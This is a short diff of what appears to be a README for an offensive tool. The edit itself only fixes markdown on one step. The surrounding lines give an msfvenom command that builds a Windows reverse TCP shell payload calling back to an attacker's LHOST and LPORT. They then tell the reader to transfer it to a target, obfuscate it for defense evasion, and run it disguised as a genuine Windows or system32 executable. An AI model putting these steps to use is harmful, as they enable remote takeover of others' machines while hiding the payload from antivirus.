@@ -73,7 +73,7 @@ Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST<IP> LPORT<PORT> -f raw
   
   ***3. Transfer Both Payload and Binary to Target System.***
   
-  ***4. Execute, But remember .bin files can evade better as per my Personal Experience so, just make your Payload Obfuscated for better Defense Evasion.
+  ***4. Execute, But remember .bin files can evade better as per my Personal Experience so, just make your Payload Obfuscated for better Defense Evasion.***
   
   ***5. After Execution, Payload will be run as your specified genuine windows executable ( system32's too ).***
   
